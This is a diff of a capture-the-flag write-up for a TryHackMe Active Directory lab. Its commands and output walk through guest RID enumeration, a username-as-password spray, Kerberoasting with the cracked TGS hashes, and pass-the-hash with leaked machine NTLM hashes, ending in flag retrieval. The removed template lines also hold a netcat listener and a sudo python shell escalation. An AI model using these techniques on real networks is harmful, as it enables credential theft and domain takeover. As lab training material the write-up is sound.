@@ -89,25 +89,22 @@ Output:
 ```text
 SMB         10.66.179.55    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
 ```
-
-
+We test a default user.
 ```bash
 nxc smb 10.66.179.55 -u 'guest' -p ''
 ```
 
 Output:
-
 ```text
 SMB         10.66.179.55    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
 SMB         10.66.179.55    445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
 ```
-
+Now that we have access to the default user, we extract the users.
 ```bash
 nxc smb 10.66.179.55 -u 'guest' -p '' --rid-brute | grep SidTypeUser
 ```
 
 Output:
-
 ```text
 SMB                      10.66.179.55    445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
 SMB                      10.66.179.55    445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
@@ -121,10 +118,11 @@ SMB                      10.66.179.55    445    DC01             1105: SOUPEDECO
 .
 ```
 
+We save the users with the following command.
 ```bash
 nxc smb 10.66.179.55 -u 'guest' -p '' --rid-brute | grep SidTypeUser | awk '{print $6}' > users.txt 
 ```
-
+Let's look at the users.txt
 ```bash
 head users.txt
 ```
@@ -143,11 +141,11 @@ SOUPEDECODE\eyara3
 SOUPEDECODE\pquinn4
 SOUPEDECODE\jharper5 
 ```
-
+We need a clean version.
 ```bash
 cut -d '\' -f2 users.txt > clean_users.txt
 ```
-
+Now, let's look at the users.txt
 ```bash
 head clean_users.txt
 ```
@@ -165,16 +163,50 @@ eyara3
 pquinn4
 jharper5
 ```
-
+We use a passwordspray where the password is the username.
 ```bash
 kerbrute passwordspray -d SOUPEDECODE.LOCAL  --user-as-pass clean_users.txt --dc 10.66.179.55 
 ```
 Output:
-
 ```text
 2026/03/05 14:04:35 >  [+] VALID LOGIN:  ybob317@SOUPEDECODE.LOCAL:ybob317
 ```
+---
 
+# 3. Initial Access
+Now, we have a credential. Let's see your shared folders.
+```bash
+nxc smb 10.66.179.55 -u 'ybob317' -p 'ybob317' --shares  
+```
+Output:
+```text
+SMB         10.66.179.55    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.66.179.55    445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
+SMB         10.66.179.55    445    DC01             [*] Enumerated shares
+SMB         10.66.179.55    445    DC01             Share           Permissions     Remark
+SMB         10.66.179.55    445    DC01             -----           -----------     ------
+SMB         10.66.179.55    445    DC01             ADMIN$                          Remote Admin
+SMB         10.66.179.55    445    DC01             backup                          
+SMB         10.66.179.55    445    DC01             C$                              Default share
+SMB         10.66.179.55    445    DC01             IPC$            READ            Remote IPC
+SMB         10.66.179.55    445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.66.179.55    445    DC01             SYSVOL          READ            Logon server share 
+SMB         10.66.179.55    445    DC01             Users           READ   
+```
+We enter the "Users" folder. We get "user.txt".
+```bash
+smbclient -U SOUPEDECODE/ybob317 //10.66.179.55/Users 
+```
+Output:
+
+```bash
+smb: \> cd ybob317\Desktop
+smb: \ybob317\Desktop\> get user.txt 
+getting file \ybob317\Desktop\user.txt of size 33 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \ybob317\Desktop\> exit
+
+```
+Now, we do a Kerberoasting.
 ```bash
 impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:'ybob317' -dc-ip 10.66.179.55 
 ```
@@ -191,15 +223,9 @@ HTTP/BackupServer       backup_svc                2024-06-17 13:28:49.476511  <n
 HTTP/WebServer          web_svc                   2024-06-17 13:29:04.569417  <never>               
 HTTPS/MonitoringServer  monitoring_svc            2024-06-17 13:29:18.511871  <never> 
 ```
-I save these users in users.tgs:
-file_svc
-firewall_svc
-backup_svc
-web_svc
-monitoring_svc
-
+We save those users in "users.tgs" and we get the TGSs.
 ```bash
-kerbrute passwordspray -d SOUPEDECODE.LOCAL  --user-as-pass clean_users.txt --dc 10.66.179.55 -request 
+impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:'ybob317' -dc-ip 10.66.179.55 -request 
 ```
 Output:
 
@@ -210,7 +236,7 @@ $krb5tgs$23$*backup_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/backup_svc*$6f6a24f3
 $krb5tgs$23$*web_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/web_svc*$819336fa482f214f47c62973f4c166b5$208c56586da2670b2b4148426e38eff0413dee755b6552b1d3a61f78ffab823b939785f8df258354f5bdb84651ef0a527be8db11c7dbab09074a8361b3d6a23619683e37210ab6d37ef520338aa1f46cf1e122c4821f6fe54435f526426386e2f7def6d8b5098b1961830ad7cfb695cca3fa5f7cce1a6c4f2113c8baa6fabc84c9d75a5ad3da863457ada41ed4e1cbb4119d4b7d92726407796ec73d4619ff2cf78a23a66bf16c4ec060afb17673a93a6a966d835a55e294ce9fcb6afd01fec9dd312c8be15b2aa36db8b5b9e29ff759482605e9d661bc70453ac4a40f563f1b3d8fb07559c53a586efcd14c2165c86c4c83aad6a0107d5ef97b14435c16371109b003ba8f662906788437b6988225f352731c7ea598e7ac25deebc241bbdec9cc4871ba2c88f4a6f3eae27e5b70d26dc318c47bd78ecc3d2321f4fd2c1dbaa308710f139bbbb42566395d5b7943fef066b8238a8f21ecae3d808f1ebc8f90b11872db356f858786c64bf8b9aa9714c38f43c1c6ff42537fd852af4e47b6f34dd568f026406761c901d03e94575e8857c12daf6d3e774ea76d14d2e7890d0113a73a8d45e90c67fe879d24a7b1024006a07208b8bfd70b12323a25b844f2c7a4f0c876dd64306b2e051a1b0c2887f70e8e8dc3aec0cc3a4d572b281decede0c68f153c67f1689de2f288e6e132d50eff05d4d74a52d2560852b55f33bdaa7380ba0e73b398412ebf9de18805d9f6b5b60c6998d8bc4eb8fa7e09d8494e6185967d82f69e46d1fc4899ca149fd7ca3107852a3a374af00db2d69089309bd6e214877db184a6c39b386ac35f626389fa74d9e80090b812088cf291322ab0a71028236a8122b64f65a59e0fe30a5c7f8fe69b6eaf8775c0f4ef9add590fd6b4f4d88758b905399714dd0677a12956bf05d0ce0194e3935c193d4097b066e4019608cc430b1d507b911d5728db10c19ea54a413880abc445ee4cc25227a1883a5d5541ef1bed3b67423fa650d4ef232c9bc7c32e98fcc85b4fc310be6321f9691d0ea1b61aa0443a7d88beaf4a45a0f48e2175bc43fbdaa61167e6e826bfaee310e1f138e12001fce4769bf4b5ed87a72b568e3747c6cf257ff91dc1ede6102f523908bdbdf0cd809412b73d351dba2376e3011e5fede4610a2d62a920143dc461f671e62c6dc635c4ab1f61f3b9e950bf78b3844720cbf9f203d7ebae6295b3e86c945bea3b7f1ca8aae58244ee2ba8d684e76df2d8dd221c32ce0325cc13a5d8b7c98f826f7c0bd61306cd493b1788b884dc0630bd1fe3ee88173d35ff8da675b66c3e11b7d40a2ee68c144dd1669097344324a566d0d9f6fd65c9135741aa1d60207baa0991d36f267065234acd4d6ca6e6413e7a2ea911abeb5f53050a9294b10c3417b0083d8fb89632319bb9bbd07151d3752fef51b2d98cccece1751970be155faa4f3e84fd806b49a8a790ebfe2ced979ee4343a7f131971f2a873e8cd3006
 $krb5tgs$23$*monitoring_svc$SOUPEDECODE.LOCAL$SOUPEDECODE.LOCAL/monitoring_svc*$92ac9eaba3cd0a9bb4339e57826dae40$baf96d35db00b34edb862eec9631f83ee0f667170d7739fa8baa91ee2b19c8b5967362e02ef2ed26c1c6a89e0f5ee86840fea4aee610c37702019ad70ac74e6b9b0df65d10ab3ae8709c38bc8017fcada1e798cd14b0956268af61e19277ee672abd1f98d3d60ad71fce458619890a5c9b0488efd9323d70ee2ddd230b7feb6ddda455d2d074c08082262a7dc7486d5e0e6031f996f0239188b6018ee409ed53375cf7fd9285705f49811f16ddb9ae6b214474f27664ed940bfff9d958752cdd183c154b0a71b53155495fe3b274e87fa8d37313815ba98b5e48b80431d3ad8af5c86edd474ade93498bc2022c9fd5db8e3133e969ea1decc54b687d099f3878b435f06b3cd640d0272e80e3f5d9f8c421b091f45a744a3c6300bd11ec22c0bd46409bed9f30992e2db241879792316f7f9c6f0127bda8b1e1e4a75ee36db2ce55cbaff38f2f5f61d70a8795785549ce3be40dc4fdfa2a6cd2399f21d5553f8c0c70c5e8d63b31e3f54696d5056da4cc99c0bb6c9a9c8e92f038ebe0f052106e496098f8515efc52ac8dfd5eb3dede2ab7a93573b3a2b67880b3bbd202c3eb285ec95eb81146de3de0788a3bd32432a3d80fbd803e2eaae37d53577df01ed439cc5c6f08b9126dd15243c0b6bcaeeb06c20c2c8c2325a747e4eb47101cf8f0a87438902da1d30336b6aa09139e890b654e22f7eb5a89cb5d17c036738b65fe3aec625f3f5342d1d580e94dead6448442103b063aa56d6a8190b63386e1cd921d0673ba764d9d79e85a0679cb7ab8d0f3b9266b8d0ec912e1992fc35d11b06a394431c9673cce7b9e67457909593d5d3586888321997dcf2ebdba41c053aae61a5be780b648b111c2528392f26820ea46411cc5c58ca52e45ed2f9f65ca9fa57c8592f69f5bb502ac7ed93e23bb5d29dbe885e638130ce5eeff98920e68fc44acf361697e73ca6accd1081d1e1bba53223daa81e085518b4029c1d778bcba06b54597b30ddd0c499b1fd223b57d50b75683346a5768b7bcd3514f9902f0113ceaf9d6857f7f958c4e0594f1ea3536622f3f417a135e13117a9f6700fa3c83bc8b8379b2e670301930251ad666571213e04e5058ad052400295889027a3197596d1fbdb1d21cede8f83f164b2ee96116fc1fb3398e647e803ef836f48ca1d4417966d0e348c80d4022072ec849c08d480ddedda9152c36712d8a951ae159166c6ff6b02cea433a05f9e971656a6c3285babb1c3d65eaa1472170b54e759e6a105a67e5b784899e7d2fcd049e75cc9cef60f8482484a28c5566fb41a578ce571b921d612eecacdf4a055883e04aa4ef816edecc979795a0d9def3d83ba68fc8bc13d0f7102948445b2c0b0ac614af8144f0505a9783ecedd21422b3ebca18ecb4116aa0f7c3535675349e632c564ca6204f2a5bc257061a70081541a455c0f7049ecca207188def666eb754ddedd9c5cae66744be935f8b87ba72773ce19918aa376c
 ```
-
+Now, we get the passwords using "john the ripper".
 ```bash
 john --format=krb5tgs --wordlist=rockyou.txt kerberoasting.tgs  
 ```
@@ -237,6 +263,7 @@ Output:
 ```text
 2026/03/05 14:26:02 >  [+] VALID LOGIN:  file_svc@SOUPEDECODE.LOCAL:Password123!!
 ```
+Let's see the shared folders of "file_svc"
 ```bash
 nxc smb 10.66.179.55 -u 'file_svc' -p 'Password123!!' --shares   
 ```
@@ -256,71 +283,92 @@ SMB         10.66.179.55    445    DC01             NETLOGON        READ        
 SMB         10.66.179.55    445    DC01             SYSVOL          READ            Logon server share 
 SMB         10.66.179.55    445    DC01             Users   
 ```
-
-Interesting finding:
-
-- ybob317@SOUPEDECODE.LOCAL:ybob317
-
-
----
-
-# 3. Exploitation
-
-```bash
-kerbrute passwordspray -d SOUPEDECODE.LOCAL  --user-as-pass clean_users.txt --dc 10.66.179.55 
-```
-Output:
-
-```text
-2026/03/05 14:04:35 >  [+] VALID LOGIN:  ybob317@SOUPEDECODE.LOCAL:ybob317
-```
-
----
-
-# 4. Initial Access
-
-Reverse shell executed:
-
+We enter at "backup" folder and get "backup_extract.txt"
 ```bash
 smbclient -U SOUPEDECODE/file_svc //10.66.179.55/backup
 ```
 
-Listener:
-
 ```bash
-nc -lvnp 4444
-```
+smb: \> dir
+  .                                   D        0  Mon Jun 17 13:41:17 2024
+  ..                                 DR        0  Fri Jul 25 13:51:20 2025
+  backup_extract.txt                  A      892  Mon Jun 17 04:41:05 2024
 
-Shell obtained:
-
-```text
-www-data@target:/var/www/html$
+                12942591 blocks of size 4096. 10707955 blocks available
+smb: \> get backup_extract.txt 
+getting file \backup_extract.txt of size 892 as backup_extract.txt (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec)
+smb: \> exit
 ```
 
 ---
 
 # 5. Privilege Escalation
-
-Checking sudo permissions:
-
 ```bash
-sudo -l
+cat backup_extract.txt 
 ```
-
-Output:
-
 ```text
-User www-data may run the following commands:
-(root) NOPASSWD: /usr/bin/python3
+WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
+DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
+CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
+MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
+PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
+ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
+MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
 ```
-
-Exploit:
+From "backup_extract.txt" we get "users.backup" and "hash.backup".
+```bash
+cat users.backup  
+```
+```text
+WebServer$
+DatabaseServer$
+CitrixServer$
+FileServer$
+MailServer$
+BackupServer$
+ApplicationServer$
+PrintServer$
+ProxyServer$
+MonitoringServer$
+```
 
 ```bash
-sudo python3 -c 'import os; os.system("/bin/bash")'
+cat hash.backup  
 ```
+```text
+c47b45f5d4df5a494bd19f13e14f7902
+406b424c7b483a42458bf6f545c936f7
+48fc7eca9af236d7849273990f6c5117
+e41da7e79a4c76dbd9cf79d1cb325559
+46a4655f18def136b3bfab7b0b4e70e3
+46a4655f18def136b3bfab7b0b4e70e3
+8cd90ac6cba6dde9d8038b068c17e9f5
+b8a38c432ac59ed00b2a373f4f050d28
+4e3f0bb3e5b6e3e662611b1a87988881
+48fc7eca9af236d7849273990f6c5117
+```
+We try a pass the hash.
+```bash
+nxc smb 10.66.179.55 -u users.backup -H hash.backup --continue-on-success  
+```
+```text
+SMB         10.66.179.55    445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
 
-Root shell obtained.
+```
+Now with "FileServer$" user and his hash , we enter at "C$" folder and get "root.txt".
+```bash
+smbclient -U SOUPEDECODE/FileServer$ //10.66.179.55/C$ --pw-nt-hash 'e41da7e79a4c76dbd9cf79d1cb325559'
+  
+```
+```bash
+smb: \> cd Users\Administrator\Desktop\
+smb: \Users\Administrator\Desktop\> get root.txt 
+getting file \Users\Administrator\Desktop\root.txt of size 33 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \Users\Administrator\Desktop\> exit
+```
 
 ---
 
@@ -329,44 +377,43 @@ Root shell obtained.
 User flag:
 
 ```bash
-cat /home/user/user.txt
+cat user.txt
 ```
 
 ```
-flag{example_user_flag}
+28189316c25dd3c0ad56d44d000d62a8
 ```
 
 Root flag:
 
 ```bash
-cat /root/root.txt
+cat root.txt
 ```
 
 ```
-flag{example_root_flag}
+27cb2be302c388d63d27c86bfdd5f56a
 ```
 
 ---
 
 # 7. Lessons Learned
 
-- Always enumerate directories in web servers.
-- Misconfigured sudo permissions can lead to privilege escalation.
-- SQL injection remains a common vulnerability.
+- Enumeration of Active Directory
+- Cracking
+- Kerberoasting
 
 ---
 
 # Tools Used
 
 - nmap
-- gobuster
-- burpsuite
-- netcat
-- python
-
+- nxc
+- smbclient
+- impacket
+- kerbrute
+- john 
 ---
 
 # References
 
-- https://gtfobins.github.io
-- https://book.hacktricks.xyz
+- https://tryhackme.com/room/soupedecode01
